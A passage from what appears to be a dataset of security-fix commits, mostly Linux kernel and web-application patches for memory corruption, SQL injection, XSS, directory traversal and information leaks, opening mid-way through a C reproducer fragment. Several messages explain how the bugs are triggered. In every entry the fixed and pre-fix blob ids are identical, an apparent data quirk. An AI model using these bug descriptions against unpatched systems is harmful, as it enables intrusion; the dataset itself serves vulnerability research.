&packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) { 		perror("sendto")  		return 1  	} 	return 0  }\n\nSigned-off-by: Jason A. Donenfeld <Jason@zx2c4.com> Acked-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    59c816c1f24df0204e01851431d3bab3eb76719c
File(s) In Commit: 
    drivers/vhost/scsi.c
Blob(s) In Commit: 
    ab4811f749f519e8949df19ae40679e940034b31
Blob(s) Before Fix: 
    ab4811f749f519e8949df19ae40679e940034b31
Projects:
    0-T-0_ps4-linux
Commit Message for 59c816c1f24df0204e01851431d3bab3eb76719c:
vhost/scsi: potential memory corruption\n\nThis code in vhost_scsi_make_tpg() is confusing because we limit "tpgt" to UINT_MAX but the data type of "tpg->tport_tpgt" and that is a u16.\n\nI looked at the context and it turns out that in vhost_scsi_set_endpoint(), "tpg->tport_tpgt" is used as an offset into the vs_tpg[] array which has VHOST_SCSI_MAX_TARGET (256) elements so anything higher than 255 then it is invalid.  I have made that the limit now.\n\nIn vhost_scsi_send_evt() we mask away values higher than 255, but now that the limit has changed, we don't need the mask.\n\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: Nicholas Bellinger <nab@linux-iscsi.org>

======================================================================
Commit With Fix: 
    5409eb314c4e072b9760b8d30b985fa0bb96a006
File(s) In Commit: 
    src/node/hooks/express/tests.js
Blob(s) In Commit: 
    dfe02c2afc248d1307b53bac4d6b5fdc46dc5422
Blob(s) Before Fix: 
    dfe02c2afc248d1307b53bac4d6b5fdc46dc5422
Projects:
    00SteinsGate00_etherpad-lite
Commit Message for 5409eb314c4e072b9760b8d30b985fa0bb96a006:
fix an issue in the path handling that allowed directory traversal

======================================================================
Commit With Fix: 
    23b133bdc452aa441fcb9b82cbf6dd05cfd342d0
File(s) In Commit: 
    fs/udf/inode.c
Blob(s) In Commit: 
    7b72b7dd8906b8b6c6e6b1d848f881969630b839
Blob(s) Before Fix: 
    7b72b7dd8906b8b6c6e6b1d848f881969630b839
Projects:
    0-T-0_ps4-linux
Commit Message for 23b133bdc452aa441fcb9b82cbf6dd05cfd342d0:
udf: Check length of extended attributes and allocation descriptors\n\nCheck length of extended attributes and allocation descriptors when loading inodes from disk. Otherwise corrupted filesystems could confuse the code and make the kernel oops.\n\nReported-by: Carl Henrik Lunde <chlunde@ping.uio.no> CC: stable@vger.kernel.org Signed-off-by: Jan Kara <jack@suse.cz>

======================================================================
Commit With Fix: 
    cf872776fc84128bb779ce2b83a37c884c3203ae
File(s) In Commit: 
    drivers/tty/tty_ldsem.c
Blob(s) In Commit: 
    d8a55e87877f06f3141602e4f08cdcb668c465b0
Blob(s) Before Fix: 
    d8a55e87877f06f3141602e4f08cdcb668c465b0
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for cf872776fc84128bb779ce2b83a37c884c3203ae:
tty: Fix hang at ldsem_down_read()\n\nWhen a controlling tty is being hung up and the hang up is waiting for a just-signalled tty reader or writer to exit, and a new tty reader/writer tries to acquire an ldisc reference concurrently with the ldisc reference release from the signalled reader/writer, the hangup can hang. The new reader/writer is sleeping in ldsem_down_read() and the hangup is sleeping in ldsem_down_write() [1].\n\nThe new reader/writer fails to wakeup the waiting hangup because the wrong lock count value is checked (the old lock count rather than the new lock count) to see if the lock is unowned.\n\nChange helper function to return the new lock count if the cmpxchg was successful  document this behavior.\n\n[1] edited dmesg log from reporter\n\nSysRq : Show Blocked State   task                        PC stack   pid father systemd         D ffff88040c4f0000     0     1      0 0x00000000  ffff88040c49fbe0 0000000000000046 ffff88040c4a0000 ffff88040c49ffd8  00000000001d3980 00000000001d3980 ffff88040c4a0000 ffff88040593d840  ffff88040c49fb40 ffffffff810a4cc0 0000000000000006 0000000000000023 Call Trace:  [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f/0xe4  [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f/0xe4  [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f/0xe4  [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f/0xe4  [<ffffffff817a6649>] schedule+0x24/0x5e  [<ffffffff817a588b>] schedule_timeout+0x15b/0x1ec  [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f/0xe4  [<ffffffff817aa691>] ? _raw_spin_unlock_irq+0x24/0x26  [<ffffffff817aa10c>] down_read_failed+0xe3/0x1b9  [<ffffffff817aa26d>] ldsem_down_read+0x8b/0xa5  [<ffffffff8142b5ca>] ? tty_ldisc_ref_wait+0x1b/0x44  [<ffffffff8142b5ca>] tty_ldisc_ref_wait+0x1b/0x44  [<ffffffff81423f5b>] tty_write+0x7d/0x28a  [<ffffffff814241f5>] redirected_tty_write+0x8d/0x98  [<ffffffff81424168>] ? tty_write+0x28a/0x28a  [<ffffffff8115d03f>] do_loop_readv_writev+0x56/0x79  [<ffffffff8115e604>] do_readv_writev+0x1b0/0x1ff  [<ffffffff8116ea0b>] ? do_vfs_ioctl+0x32a/0x489  [<ffffffff81167d9d>] ? final_putname+0x1d/0x3a  [<ffffffff8115e6c7>] vfs_writev+0x2e/0x49  [<ffffffff8115e7d3>] SyS_writev+0x47/0xaa  [<ffffffff817ab822>] system_call_fastpath+0x16/0x1b bash            D ffffffff81c104c0     0  5469   5302 0x00000082  ffff8800cf817ac0 0000000000000046 ffff8804086b22a0 ffff8800cf817fd8  00000000001d3980 00000000001d3980 ffff8804086b22a0 ffff8800cf817a48  000000000000b9a0 ffff8800cf817a78 ffffffff81004675 ffff8800cf817a44 Call Trace:  [<ffffffff81004675>] ? dump_trace+0x165/0x29c  [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f/0xe4  [<ffffffff8100edda>] ? save_stack_trace+0x26/0x41  [<ffffffff817a6649>] schedule+0x24/0x5e  [<ffffffff817a588b>] schedule_timeout+0x15b/0x1ec  [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f/0xe4  [<ffffffff817a9f03>] ? down_write_failed+0xa3/0x1c9  [<ffffffff817aa691>] ? _raw_spin_unlock_irq+0x24/0x26  [<ffffffff817a9f0b>] down_write_failed+0xab/0x1c9  [<ffffffff817aa300>] ldsem_down_write+0x79/0xb1  [<ffffffff817aada3>] ? tty_ldisc_lock_pair_timeout+0xa5/0xd9  [<ffffffff817aada3>] tty_ldisc_lock_pair_timeout+0xa5/0xd9  [<ffffffff8142bf33>] tty_ldisc_hangup+0xc4/0x218  [<ffffffff81423ab3>] __tty_hangup+0x2e2/0x3ed  [<ffffffff81424a76>] disassociate_ctty+0x63/0x226  [<ffffffff81078aa7>] do_exit+0x79f/0xa11  [<ffffffff81086bdb>] ? get_signal_to_deliver+0x206/0x62f  [<ffffffff810b4bfb>] ? lock_release_holdtime.part.8+0xf/0x16e  [<ffffffff81079b05>] do_group_exit+0x47/0xb5  [<ffffffff81086c16>] get_signal_to_deliver+0x241/0x62f  [<ffffffff810020a7>] do_signal+0x43/0x59d  [<ffffffff810f2af7>] ? __audit_syscall_exit+0x21a/0x2a8  [<ffffffff810b4bfb>] ? lock_release_holdtime.part.8+0xf/0x16e  [<ffffffff81002655>] do_notify_resume+0x54/0x6c  [<ffffffff817abaf8>] int_signal+0x12/0x17\n\nReported-by: Sami Farin <sami.farin@gmail.com> Cc: <stable@vger.kernel.org> # 3.12.x Signed-off-by: Peter Hurley <peter@hurleysoftware.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    e0c9c0afd2fc958ffa34b697972721d81df8a56f
File(s) In Commit: 
    fs/namespace.c
Blob(s) In Commit: 
    1f4f9dac6e5af8017e41ab497b92e0515e5ed71c
Blob(s) Before Fix: 
    1f4f9dac6e5af8017e41ab497b92e0515e5ed71c
Projects:
    0-T-0_ps4-linux
Commit Message for e0c9c0afd2fc958ffa34b697972721d81df8a56f:
mnt: Update detach_mounts to leave mounts connected\n\nNow that it is possible to lazily unmount an entire mount tree and leave the individual mounts connected to each other add a new flag UMOUNT_CONNECTED to umount_tree to force this behavior and use this flag in detach_mounts.\n\nThis closes a bug where the deletion of a file or directory could trigger an unmount and reveal data under a mount point.\n\nCc: stable@vger.kernel.org Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com>

======================================================================
Commit With Fix: 
    cd4a40174b71acd021877341684d8bb1dc8ea4ae
File(s) In Commit: 
    fs/namespace.c
Blob(s) In Commit: 
    acc5583764dc0925ad2f4745824d3848b743e978
Blob(s) Before Fix: 
    acc5583764dc0925ad2f4745824d3848b743e978
Projects:
    0-T-0_ps4-linux
Commit Message for cd4a40174b71acd021877341684d8bb1dc8ea4ae:
mnt: Fail collect_mounts when applied to unmounted mounts\n\nThe only users of collect_mounts are in audit_tree.c\n\nIn audit_trim_trees and audit_add_tree_rule the path passed into collect_mounts is generated from kern_path passed an audit_tree pathname which is guaranteed to be an absolute path.   In those cases collect_mounts is obviously intended to work on mounted paths and if a race results in paths that are unmounted when collect_mounts it is reasonable to fail early.\n\nThe paths passed into audit_tag_tree don't have the absolute path check.  But are used to play with fsnotify and otherwise interact with the audit_trees, so again operating only on mounted paths appears reasonable.\n\nAvoid having to worry about what happens when we try and audit unmounted filesystems by restricting collect_mounts to mounts that appear in the mount tree.\n\nSigned-off-by: "Eric W. Biederman" <ebiederm@xmission.com>

======================================================================
Commit With Fix: 
    fdf9d455098f54f7666c702ae464e6ea21e25411
File(s) In Commit: 
    deps/lua/src/ldo.c
Blob(s) In Commit: 
    514f7a2a31f6b9dadbefb7f7983e7a395c4d0643
Blob(s) Before Fix: 
    514f7a2a31f6b9dadbefb7f7983e7a395c4d0643
Projects:
    009acc_redis
Commit Message for fdf9d455098f54f7666c702ae464e6ea21e25411:
disable loading lua bytecode

======================================================================
Commit With Fix: 
    976da329ff03ecdfca3030eb6efe3c85e6db9999
File(s) In Commit: 
    lib/bson/object_id.rb
Blob(s) In Commit: 
    b8503f3b4272977a8b74334ba153c5042cc6b42a
Blob(s) Before Fix: 
    b8503f3b4272977a8b74334ba153c5042cc6b42a
Projects:
    08_bson-ruby
Commit Message for 976da329ff03ecdfca3030eb6efe3c85e6db9999:
Use \A \z for checking regex on legal

======================================================================
Commit With Fix: 
    4f2a95f877d406a054f9f2253475fe58c76aa03d
File(s) In Commit: 
    pimcore/modules/admin/controllers/AssetController.php
Blob(s) In Commit: 
    e897b8d3fb8bd73679ebacb24252d317eeca1924
Blob(s) Before Fix: 
    e897b8d3fb8bd73679ebacb24252d317eeca1924
Projects:
    10w042_pimcore
Commit Message for 4f2a95f877d406a054f9f2253475fe58c76aa03d:
AssetController: directory traversal vulnerability issue\n\ngit-svn-id: http://www.pimcore.org/svn/pimcore/private/core/trunk@6458 1f8fe7d8-47f0-464c-8d0a-336f4953ab05

======================================================================
Commit With Fix: 
    1c6692e8287deed7f3356b6a1e2e9b7fe4e858dd
File(s) In Commit: 
    pimcore/modules/admin/controllers/AssetController.php
Blob(s) In Commit: 
    43b1ac91e706203d4f61b333aa769e5333e98a6f
Blob(s) Before Fix: 
    43b1ac91e706203d4f61b333aa769e5333e98a6f
Projects:
    10w042_pimcore
Commit Message for 1c6692e8287deed7f3356b6a1e2e9b7fe4e858dd:
fixed sql injection issue\n\ngit-svn-id: http://www.pimcore.org/svn/pimcore/private/core/trunk@6460 1f8fe7d8-47f0-464c-8d0a-336f4953ab05

======================================================================
Commit With Fix: 
    303fa88fe664ded4bf8753b997abd916f0a3c03f
File(s) In Commit: 
    upload/catalog/controller/account/address.php
Blob(s) In Commit: 
    a84f99fdaa714546df5966ad355899371978bc08
Blob(s) Before Fix: 
    a84f99fdaa714546df5966ad355899371978bc08
Projects:
    0xhacking_opencart-1
Commit Message for 303fa88fe664ded4bf8753b997abd916f0a3c03f:
Fixed low risk XSS issue with user account address edit. Thanks to @robert81 for the find.\n\nClose #3721

======================================================================
Commit With Fix: 
    ce40cd3fc7fa40a6119e5fe6c0f2bc0eb4541009
File(s) In Commit: 
    arch/x86/kvm/lapic.h
Blob(s) In Commit: 
    9d8fcde52027123fe867559b7deff5ffd67bc080
Blob(s) Before Fix: 
    9d8fcde52027123fe867559b7deff5ffd67bc080
Projects:
    0-T-0_ps4-linux
Commit Message for ce40cd3fc7fa40a6119e5fe6c0f2bc0eb4541009:
kvm: x86: fix kvm_apic_has_events to check for NULL pointer\n\nMalicious (or egregiously buggy) userspace can trigger it, but it should never happen in normal operation.\n\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    3f7352bf21f8fd7ba3e2fcef9488756f188e12be
File(s) In Commit: 
    arch/x86/net/bpf_jit_comp.c
Blob(s) In Commit: 
    ddeff4844a100de83b52ef9dae9f42974666dc23
Blob(s) Before Fix: 
    ddeff4844a100de83b52ef9dae9f42974666dc23
Projects:
    0-T-0_ps4-linux
Commit Message for 3f7352bf21f8fd7ba3e2fcef9488756f188e12be:
x86: bpf_jit: fix compilation of large bpf programs\n\nx86 has variable length encoding. x86 JIT compiler is trying to pick the shortest encoding for given bpf instruction. While doing so the jump targets are changing, so JIT is doing multiple passes over the program. Typical program needs 3 passes. Some very short programs converge with 2 passes. Large programs may need 4 or 5. But specially crafted bpf programs may hit the pass limit and if the program converges on the last iteration the JIT compiler will be producing an image full of 'int 3' insns. Fix this corner case by doing final iteration over bpf program.\n\nFixes: 0a14842f5a3c ("net: filter: Just In Time compiler for x86-64") Reported-by: Daniel Borkmann <daniel@iogearbox.net> Signed-off-by: Alexei Starovoitov <ast@plumgrid.com> Tested-by: Daniel Borkmann <daniel@iogearbox.net> Acked-by: Daniel Borkmann <daniel@iogearbox.net> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    65d717415a271242b9a30a5330d4eabac1c1a837
File(s) In Commit: 
    application/controllers/admin/dataentry.php
Blob(s) In Commit: 
    35ed84c1202f23dddd92da7eeda8323db7bd436d
Blob(s) Before Fix: 
    35ed84c1202f23dddd92da7eeda8323db7bd436d
Projects:
    3limin4t0r_LimeSurvey
Commit Message for 65d717415a271242b9a30a5330d4eabac1c1a837:
Fixed issue #9720: SQL injection vulnerability in data entry

======================================================================
Commit With Fix: 
    48900cb6af4282fa0fb6ff4d72a81aa3dadb5c39
File(s) In Commit: 
    drivers/net/virtio_net.c
Blob(s) In Commit: 
    237f8e5e493ddaae958684e8ed411c6f7f2363d6
Blob(s) Before Fix: 
    237f8e5e493ddaae958684e8ed411c6f7f2363d6
Projects:
    0-T-0_ps4-linux
Commit Message for 48900cb6af4282fa0fb6ff4d72a81aa3dadb5c39:
virtio-net: drop NETIF_F_FRAGLIST\n\nvirtio declares support for NETIF_F_FRAGLIST, but assumes that there are at most MAX_SKB_FRAGS + 2 fragments which isn't always true with a fraglist.\n\nA longer fraglist in the skb will make the call to skb_to_sgvec overflow the sg array, leading to memory corruption.\n\nDrop NETIF_F_FRAGLIST so we only get what we can handle.\n\nCc: Michael S. Tsirkin <mst@redhat.com> Signed-off-by: Jason Wang <jasowang@redhat.com> Acked-by: Michael S. Tsirkin <mst@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    9b6e6a8334d56354853f9c255d1395c2ba570e0a
File(s) In Commit: 
    arch/x86/entry/entry_64.S
Blob(s) In Commit: 
    8668bbdd2bcac4792fdfe73f9e3181549a92f7fb
Blob(s) Before Fix: 
    8668bbdd2bcac4792fdfe73f9e3181549a92f7fb
Projects:
    0-T-0_ps4-linux
Commit Message for 9b6e6a8334d56354853f9c255d1395c2ba570e0a:
x86/nmi/64: Switch stacks on userspace NMI entry\n\nReturning to userspace is tricky: IRET can fail, and ESPFIX can rearrange the stack prior to IRET.\n\nThe NMI nesting fixup relies on a precise stack layout and atomic IRET.  Rather than trying to teach the NMI nesting fixup to handle ESPFIX and failed IRET, punt: run NMIs that came from user mode on the normal kernel stack.\n\nThis will make some nested NMIs visible to C code, but the C code is okay with that.\n\nAs a side effect, this should speed up perf: it eliminates an RDMSR when NMIs come from user mode.\n\nSigned-off-by: Andy Lutomirski <luto@kernel.org> Reviewed-by: Steven Rostedt <rostedt@goodmis.org> Reviewed-by: Borislav Petkov <bp@suse.de> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: stable@vger.kernel.org Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    f274aa6787cb8b3ec1cc12c440a56665b7231882
File(s) In Commit: 
    kdcproxy/__init__.py
Blob(s) In Commit: 
    9fc1418766308b8daa5efad151c265cc5d4d699f
Blob(s) Before Fix: 
    9fc1418766308b8daa5efad151c265cc5d4d699f
Projects:
    mark7_kdcproxy
Commit Message for f274aa6787cb8b3ec1cc12c440a56665b7231882:
Enforce a maximum packet length\n\nPermanently fixes CVE-2015-5159 for all applications.

======================================================================
Commit With Fix: 
    df5d2867e8004e51e18b89865bc4aa69229227b3
File(s) In Commit: 
    src/libjasper/mif/mif_cod.c
Blob(s) In Commit: 
    5afc0a249ba700ab337e47ef56ead0114cfc5385
Blob(s) Before Fix: 
    5afc0a249ba700ab337e47ef56ead0114cfc5385
Projects:
    did-g_jasper
Commit Message for df5d2867e8004e51e18b89865bc4aa69229227b3:
CVE-2015-5221

======================================================================
Commit With Fix: 
    f9a70e79391f6d7c2a912d785239ee8effc1922d
File(s) In Commit: 
    ui/vnc.c
Blob(s) In Commit: 
    19ce988f5509c4fc4d98e50879c8555d78fd6022
Blob(s) Before Fix: 
    19ce988f5509c4fc4d98e50879c8555d78fd6022
Projects:
    0-T-0_docker
    0-T-0_ps4-linux
    01hyang_qemu
Commit Message for f9a70e79391f6d7c2a912d785239ee8effc1922d:
ui/vnc: limit client_cut_text msg payload size\n\ncurrently a malicious client could define a payload size of 2^32 - 1 bytes and send up to that size of data to the vnc server. The server would allocated that amount of memory which could easily create an out of memory condition.\n\nThis patch limits the payload size to 1MB max.\n\nPlease note that client_cut_text messages are currently silently ignored.\n\nSigned-off-by: Peter Lieven <pl@kamp.de> Signed-off-by: Gerd Hoffmann <kraxel@redhat.com>

======================================================================
Commit With Fix: 
    cbb4be652d374f64661137756b8f357a1827d6a4
File(s) In Commit: 
    drivers/usb/serial/whiteheat.c
Blob(s) In Commit: 
    d3ea90bef84d98a67f110f6040ca70ec12b7a5fb
Blob(s) Before Fix: 
    d3ea90bef84d98a67f110f6040ca70ec12b7a5fb
Projects:
    0-T-0_ps4-linux
Commit Message for cbb4be652d374f64661137756b8f357a1827d6a4:
USB: whiteheat: fix potential null-deref at probe\n\nFix potential null-pointer dereference at probe by making sure that the required endpoints are present.\n\nThe whiteheat driver assumes there are at least five pairs of bulk endpoints, of which the final pair is used for the "command port". An attempt to bind to an interface with fewer bulk endpoints would currently lead to an oops.\n\nFixes CVE-2015-5257.\n\nReported-by: Moein Ghasemzadeh <moein@istuary.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Johan Hovold <johan@kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    4f3555b217be8723e8045f9816d147b5f684ec57
File(s) In Commit: 
    app/assets/javascripts/hidden_values.js
Blob(s) In Commit: 
    14cff054f055206396f4366f6536ff0d523c5f82
Blob(s) Before Fix: 
    14cff054f055206396f4366f6536ff0d523c5f82
Projects:
    0-T-0_foreman
Commit Message for 4f3555b217be8723e8045f9816d147b5f684ec57:
Fixes #11859 - handle HTML in parameters safely when hiding values (CVE-2015-5282)

======================================================================
Commit With Fix: 
    8e2d61e0aed2b7c4ecb35844fe07e0b2b762dee4
File(s) In Commit: 
    net/sctp/protocol.c
Blob(s) In Commit: 
    3d9ea9a48289af7324d2c96d82938dd978634ce5
Blob(s) Before Fix: 
    3d9ea9a48289af7324d2c96d82938dd978634ce5
Projects:
    0-T-0_ps4-linux
Commit Message for 8e2d61e0aed2b7c4ecb35844fe07e0b2b762dee4:
sctp: fix race on protocol/netns initialization\n\nConsider sctp module is unloaded and is being requested because an user is creating a sctp socket.\n\nDuring initialization, sctp will add the new protocol type and then initialize pernet subsys:\n\n        status = sctp_v4_protosw_init()          if (status)                 goto err_protosw_init \n\n        status = sctp_v6_protosw_init()          if (status)                 goto err_v6_protosw_init \n\n        status = register_pernet_subsys(&sctp_net_ops) \n\nThe problem is that after those calls to sctp_v{4,6}_protosw_init(), it is possible for userspace to create SCTP sockets like if the module is already fully loaded. If that happens, one of the possible effects is that we will have readers for net->sctp.local_addr_list list earlier than expected and sctp_net_init() does not take precautions while dealing with that list, leading to a potential panic but not limited to that, as sctp_sock_init() will copy a bunch of blank/partially initialized values from net->sctp.\n\nThe race happens like this:\n\n     CPU 0                           |  CPU 1   socket()                           |    __sock_create                     | socket()     inet_create                      |  __sock_create      list_for_each_entry_rcu(        |         answer, &inetsw[sock->type], |         list) {                      |   inet_create       /* no hits */                  |      if (unlikely(err)) {            |       ...                            |       request_module()               |       /* socket creation is blocked  |        * the module is fully loaded  |        */                            |        sctp_init                     |         sctp_v4_protosw_init         |          inet_register_protosw       |           list_add_rcu(&p->list,     |                        last_perm)    |                                      |  list_for_each_entry_rcu(                                      |     answer, &inetsw[sock->type],         sctp_v6_protosw_init         |     list) {                                      |     /* hit, so assumes protocol                                      |      * is already loaded                                      |      */                                      |  /* socket creation continues                                      |   * before netns is initialized                                      |   */         register_pernet_subsys       |\n\nSimply inverting the initialization order between register_pernet_subsys() and sctp_v4_protosw_init() is not possible because register_pernet_subsys() will create a control sctp socket, so the protocol must be already visible by then. Deferring the socket creation to a work-queue is not good specially because we loose the ability to handle its errors.\n\nSo, as suggested by Vlad, the fix is to split netns initialization in two moments: defaults and control socket, so that the defaults are already loaded by when we register the protocol, while control socket initialization is kept at the same moment it is today.\n\nFixes: 4db67e808640 ("sctp: Make the address lists per network namespace") Signed-off-by: Vlad Yasevich <vyasevich@gmail.com> Signed-off-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    3c1b60cfa62d39e5fff5a53a5bc53dae189e740e
File(s) In Commit: 
    src/hooks/abrt-hook-ccpp.c
Blob(s) In Commit: 
    58d9c28d20a2534cb92eea1dbb19069064393751
Blob(s) Before Fix: 
    58d9c28d20a2534cb92eea1dbb19069064393751
Projects:
    AlexxNica_abrt
Commit Message for 3c1b60cfa62d39e5fff5a53a5bc53dae189e740e:
ccpp: save abrt core files only to new files\n\nPrior this commit abrt-hook-ccpp saved a core file generated by a process running a program whose name starts with "abrt" in DUMP_LOCATION/$(basename program)-coredump. If the file was a symlink, the hook followed and wrote core file to the symlink's target.\n\nAddresses CVE-2015-5287\n\nSigned-off-by: Jakub Filak <jfilak@redhat.com>

======================================================================
Commit With Fix: 
    257578a23d1537a2d235aaa2b1488ee4f818e360
File(s) In Commit: 
    src/gui-wizard-gtk/wizard.c
Blob(s) In Commit: 
    2d8d6bab24d006dd146f866fc6723e6dd86d3790
Blob(s) Before Fix: 
    2d8d6bab24d006dd146f866fc6723e6dd86d3790
Projects:
    AlexxNica_abrt
Commit Message for 257578a23d1537a2d235aaa2b1488ee4f818e360:
wizard: fix save users changes after reviewing dump dir files\n\nIf the user reviewed the dump dir's files during reporting the crash, the changes was thrown away and original data was passed to the bugzilla bug report.\n\nreport-gtk saves the first text view buffer and then reloads data from the reported problem directory, which causes that the changes made to those text views are thrown away.\n\nFunction save_text_if_changed(), except of saving text, also reload the files from dump dir and update gui state from the dump dir. The commit moves the reloading and updating gui functions away from this function.\n\nRelated to rhbz#1270235\n\nSigned-off-by: Matej Habrnal <mhabrnal@redhat.com>

======================================================================
Commit With Fix: 
    cb1845743bd11ba74a49b6b522c080df86a17d51
File(s) In Commit: 
    admin/filebrowser.php
Blob(s) In Commit: 
    4ad2719586e9eb3d089530fa4ede9eb14ed3a0f2
Blob(s) Before Fix: 
    4ad2719586e9eb3d089530fa4ede9eb14ed3a0f2
Projects:
    1nv4d3r5_GetSimpleCMS
Commit Message for cb1845743bd11ba74a49b6b522c080df86a17d51:
fix #1059

======================================================================
Commit With Fix: 
    89d7cbcd3697c8a842f1a61b99e9a78f295798fb
File(s) In Commit: 
    app/views/events/_menu.html.erb
Blob(s) In Commit: 
    9494e5fccd078b8ae0f5b070efb5c3386a799b14
Blob(s) Before Fix: 
    9494e5fccd078b8ae0f5b070efb5c3386a799b14
Projects:
    AllenRDCo_snorby
Commit Message for 89d7cbcd3697c8a842f1a61b99e9a78f295798fb:
Fixed xss issue

======================================================================
Commit With Fix: 
    150e3e6d851acb31a0b15ce93380a7dab14203fa
File(s) In Commit: 
    eventapp/lib/gcloud.rb
Blob(s) In Commit: 
    c225e0221091dd0007039c954985649a75d8f7f8
Blob(s) Before Fix: 
    c225e0221091dd0007039c954985649a75d8f7f8
Projects:
    ingtk_isucon5-qualify
Commit Message for 150e3e6d851acb31a0b15ce93380a7dab14203fa:
Merge pull request #5 from sorah/osci\n\neventapp: Use array to pass arguments

======================================================================
Commit With Fix: 
    e809ea80e3527e32c40756eddd8b2ae44bc3af1a
File(s) In Commit: 
    lazy_bdecode.cpp
Blob(s) In Commit: 
    fe6cb6723ccb2e81f1e37d75e798823f01e0bf21
Blob(s) Before Fix: 
    fe6cb6723ccb2e81f1e37d75e798823f01e0bf21
Projects:
    jjpe_bootstrap-dht
Commit Message for e809ea80e3527e32c40756eddd8b2ae44bc3af1a:
Check for out-of-bounds bencoded lengths before advancing buffer pointer

======================================================================
Commit With Fix: 
    b6878d9e03043695dbf3fa1caa6dfc09db225b16
File(s) In Commit: 
    drivers/md/md.c
Blob(s) In Commit: 
    e25f00f0138a7b4d82a5ae4f6fc7e1b6f0bb1b30
Blob(s) Before Fix: 
    e25f00f0138a7b4d82a5ae4f6fc7e1b6f0bb1b30
Projects:
    0-T-0_ps4-linux
Commit Message for b6878d9e03043695dbf3fa1caa6dfc09db225b16:
md: use kzalloc() when bitmap is disabled\n\nIn drivers/md/md.c get_bitmap_file() uses kmalloc() for creating a mdu_bitmap_file_t called "file".\n\n5769         file = kmalloc(sizeof(*file), GFP_NOIO)  5770         if (!file) 5771                 return -ENOMEM \n\nThis structure is copied to user space at the end of the function.\n\n5786         if (err == 0 && 5787             copy_to_user(arg, file, sizeof(*file))) 5788                 err = -EFAULT\n\nBut if bitmap is disabled only the first byte of "file" is initialized with zero, so it's possible to read some bytes (up to 4095) of kernel space memory from user space. This is an information leak.\n\n5775         /* bitmap disabled, zero the first byte and copy out */ 5776         if (!mddev->bitmap_info.file) 5777                 file->pathname[0] = '\0' \n\nSigned-off-by: Benjamin Randazzo <benjamin@randazzo.fr> Signed-off-by: NeilBrown <neilb@suse.com>

======================================================================
Commit With Fix: 
    f15133df088ecadd141ea1907f2c96df67c729f0
File(s) In Commit: 
    fs/namei.c
Blob(s) In Commit: 
    fe30d3be43a8b381d3b9ac3016b28531996f91b7
Blob(s) Before Fix: 
    fe30d3be43a8b381d3b9ac3016b28531996f91b7
Projects:
    0-T-0_ps4-linux
Commit Message for f15133df088ecadd141ea1907f2c96df67c729f0:
path_openat(): fix double fput()\n\npath_openat() jumps to the wrong place after do_tmpfile() - it has already done path_cleanup() (as part of path_lookupat() called by do_tmpfile()), so doing that again can lead to double fput().\n\nCc: stable@vger.kernel.org	# v3.11+ Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

======================================================================
Commit With Fix: 
    9c57f3a4291f2311ae05f22c10eedeb0f69337ab
File(s) In Commit: 
    wp-includes/class-wp-xmlrpc-server.php
Blob(s) In Commit: 
    9121c07a17237578a52b71ff5999b3d4df02826e
Blob(s) Before Fix: 
    9121c07a17237578a52b71ff5999b3d4df02826e
Projects:
    023yangbo_WordPress
Commit Message for 9c57f3a4291f2311ae05f22c10eedeb0f69337ab:
XMLRPC: Don't allow private posts to be sticky.\n\nMerge of [34135] to the 4.3 branch.\n\nSee #20662. Built from https://develop.svn.wordpress.org/branches/4.3@34151\n\n git-svn-id: http://core.svn.wordpress.org/branches/4.3@34119 1a063a9b-81f0-0310-95a4-ce76da25c4cd

======================================================================
Commit With Fix: 
    0dde92def6b9f276f05ff77abb07ead318f9ec23
File(s) In Commit: 
    system/database/DB_active_rec.php
Blob(s) In Commit: 
    33e2ea27af2657b28f5f3a2277d559085860cda9
Blob(s) Before Fix: 
    33e2ea27af2657b28f5f3a2277d559085860cda9
Projects:
    0000000000000000000_CodeIgniter
Commit Message for 0dde92def6b9f276f05ff77abb07ead318f9ec23:
fixes potential SQL injection vector in Active Record offset()

======================================================================
Commit With Fix: 
    b1b3fd61c7697ad2073cd253d31c9462929e7bb5
File(s) In Commit: 
    modules/Configurator/UploadFileCheck.php
Blob(s) In Commit: 
    37c565cef1625405b8a24d9c5010b9777a75fde8
Blob(s) Before Fix: 
    37c565cef1625405b8a24d9c5010b9777a75fde8
Projects:
    13ttys_SuiteCRM
Commit Message for b1b3fd61c7697ad2073cd253d31c9462929e7bb5:
Don't leave files which fail the upload check in the tmp company logo directory.

======================================================================
Commit With Fix: 
    8558533a9148a2a0302c9c177abff8e4e4075b92
File(s) In Commit: 
    lib/classes/database/class.Database.php
Blob(s) In Commit: 
    85ed594b6e946d73ed9b6ec33d6e17d2e8320c4d
Blob(s) Before Fix: 
    85ed594b6e946d73ed9b6ec33d6e17d2e8320c4d
Projects:
    23networks_Froxlor
Commit Message for 8558533a9148a2a0302c9c177abff8e4e4075b92:
replace passwords even before logging, not just for display\n\nSigned-off-by: Michael Kaufmann (d00p) <d00p@froxlor.org>

======================================================================
Commit With Fix: 
